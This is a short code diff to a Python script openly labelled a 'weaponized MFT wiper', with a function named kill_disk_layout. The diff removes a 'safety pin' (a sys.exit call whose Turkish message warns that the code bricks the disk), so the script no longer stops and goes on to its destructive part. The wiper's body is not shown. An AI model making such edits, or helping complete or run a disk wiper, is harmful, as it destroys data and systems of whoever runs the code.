@@ -1,9 +1,5 @@
 import sys
 import os
-
-# --- EMNİYET PİMİ ---
-sys.exit("UYARI: BU KOD DİSKİ KULLANILAMAZ HALE GETİRİR (BRICK).")
-
 print("--- WEAPONIZED MFT WIPER ---")
 
 def kill_disk_layout():
